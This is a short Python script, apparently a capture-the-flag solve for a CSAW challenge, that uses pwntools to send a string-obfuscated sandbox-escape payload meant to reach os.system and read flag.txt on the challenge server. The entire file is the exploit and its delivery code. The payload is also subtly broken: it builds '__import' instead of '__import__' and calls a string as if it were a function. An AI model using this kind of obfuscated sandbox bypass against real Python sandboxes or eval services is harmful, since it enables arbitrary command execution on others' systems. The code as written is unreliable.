from pwn import *

# Connect to the challenge server
host = "pwn.chal.csaw.io"
port = 8000

# Obfuscated payload to bypass the sandbox
payload = (
    """
    ooo = '__import__';
    lol = 'getattr';
    hhh = 'os';
    yyy = 'system';
    cmd = 'cat flag.txt';
    evil = ooo[0]+ooo[1]+ooo[2]+ooo[3]+ooo[4]+ooo[5]+ooo[6]+ooo[7];
    killer = (evil)(hhh);
    toxic = (getattr)(killer, yyy);
    toxic(cmd)
    """
)

# Send the payload
conn = remote(host, port)
print(conn.recvuntil(b">>> "))
conn.sendline(payload)

# Receive the output
response = conn.recvline()
print(response.decode())

conn.close()
